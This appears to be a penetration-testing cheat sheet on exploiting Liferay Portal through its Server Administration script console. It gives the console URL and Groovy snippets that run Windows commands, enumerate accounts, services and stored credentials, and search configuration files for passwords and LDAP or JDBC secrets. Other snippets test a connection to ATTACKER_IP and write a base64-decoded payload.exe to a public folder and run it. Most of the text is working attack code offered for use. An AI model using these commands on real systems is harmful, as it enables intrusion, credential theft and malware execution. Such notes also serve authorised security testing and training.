# Liferay

Liferay Portal commonly runs on Tomcat and may expose powerful administrative functionality after login. If you recover portal credentials from deployment files, check the Server Administration script console for command execution.

## Discovery

```bash
nmap -sV -sC TARGET -p8080
```

Look for titles or content like:

```text
Home - Liferay Portal
Liferay Community Edition Portal 7.4.x CE
Apache Tomcat
```
## Version

After login, the footer or admin pages may show the exact build:

```text
Liferay Community Edition Portal 7.4.x CE GAxx
```

## Server Administration Script Console

The script console is reachable from the control panel:

```text
/group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_mvcRenderCommandName=%2Fserver_admin%2Fview&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1=script
```

Use Groovy to run commands:

```groovy
def process = "cmd /c whoami".execute()
println process.text
```

Windows enumeration from the console:

```groovy
println 'cmd /c whoami /all'.execute().text
println 'cmd /c dir C:\\'.execute().text
println 'cmd /c netstat -ano'.execute().text
println 'cmd /c tasklist /svc'.execute().text
println 'cmd /c cmdkey /list'.execute().text
println 'cmd /c schtasks /query /fo LIST /v'.execute().text
println 'cmd /c wmic service get Name,StartName,PathName'.execute().text
```

Config hunting from the console:

```groovy
println 'cmd /c dir /s /b C:\\Liferay\\*.properties C:\\Liferay\\*.config C:\\Liferay\\*.xml'.execute().text
println 'cmd /c findstr /si "ldap bind principal credential password jdbc" C:\\Liferay\\*.properties C:\\Liferay\\*.config C:\\Liferay\\*.xml'.execute().text
println 'cmd /c findstr /si password C:\\Share\\*.*'.execute().text
```

```groovy
println 'powershell.exe -nop -ep bypass -command Test-NetConnection ATTACKER_IP -Port 8080'.execute().text
```

## Groovy Reverse Shell

On Windows, use `powershell` or `cmd.exe`;

## Writing Files from Groovy

If HTTP/SMB transfer is blocked but the script console works, base64 the payload locally and write it on target:

```groovy
def b64 = "BASE64_EXE_OR_SCRIPT"
new File("C:\\Users\\PUBLIC\\payload.exe").bytes = b64.decodeBase64()
println "Written: " + new File("C:\\Users\\PUBLIC\\payload.exe").length()
```

Execute it:

```groovy
println 'cmd /c start /b C:\\Users\\PUBLIC\\payload.exe'.execute().text
```

## Local Service Context

Liferay on Windows may run under a local service account through NSSM:

```text
nssm.exe    Liferay
java.exe    Tomcat/Liferay process
```

